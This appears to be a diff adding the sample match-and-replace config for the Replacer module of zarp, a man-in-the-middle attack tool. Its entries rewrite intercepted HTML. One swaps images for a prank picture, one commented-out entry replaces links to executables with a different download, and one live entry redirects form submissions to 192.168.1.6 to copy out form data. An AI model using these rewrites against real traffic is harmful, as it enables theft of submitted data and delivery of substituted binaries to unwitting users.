@@ -1,0 +1,32 @@
+#
+# zarp's match and replace config file for the Replacer
+# module.  Entries should be listed in the following form:
+#
+#           match = match replace
+#
+# This module supports two different match forms; regex and HTML tags.  In
+# the first case, anything that re.sub accepts, this will accept.  In the
+# latter case, tags can be specified in the following:
+#
+#           2 img src = http://google.com
+#
+# This will parse each img tag and replace the src with http://google.com. To
+# distinguish between the two types, 1 should be prefixed to regex entries, and
+# 2 should be prefixed to HTML tags.
+# 
+# Several test entries have been listed here.  The regex isnt perfect because regex
+# with HTML is a monster.
+#
+
+# match img tags and replace the src with rick astley
+#1 (?<=<img src=['"]).*(?=['"] ) = http://whitsblog.com/wp-content/uploads/2012/05/Rick-astley-never-gonna-give-you-up.jpg
+
+# match exe, zip, and msi files and replace with a download link to Putty
+#1 (?<=href=['"]).*[.exe|.zip](?=['"] ) = http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+
+# match img src tags and replace with rick astley
+2 img src = http://whitsblog.com/wp-content/uploads/2012/05/Rick-astley-never-gonna-give-you-up.jpg
+
+# modify form actions to submit to another server, which can be used to copy out 
+# form parameters and forward them on
+2 form action = http://192.168.1.6/
